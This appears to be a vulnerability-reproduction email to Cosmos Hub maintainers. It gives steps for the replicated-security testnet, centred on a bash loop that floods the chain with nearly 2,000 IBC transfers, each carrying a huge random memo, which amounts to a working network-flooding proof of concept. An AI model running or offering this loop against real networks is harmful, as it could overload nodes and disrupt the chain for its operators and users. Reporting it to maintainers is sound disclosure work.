Hi, I'm writing to ensure that you are now succeeding with the replication.

1) sync the cosmos hub replicated security testnet with this script

https://github.com/cosmos/gaia/pull/2745

2) run this line of code against a different wallet and starting with the
current sequence number of the wallet you're using:

for i in {3045..5000}; do gaiad tx ibc-transfer transfer transfer
channel-58 cosmos140rptve4cr0mxgknzprl86868nfslydfyem3nq 1uatom --from test
--keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000)
--chain-id provider --gas auto --yes --sequence $i ; sleep .1 ; done

Note: you'll need to add a wallet that is named test to the test keyring
backend.

The first value for i should be the current account sequence number.

-----------

Please let me know if you would like a video of this or anything else from
me.
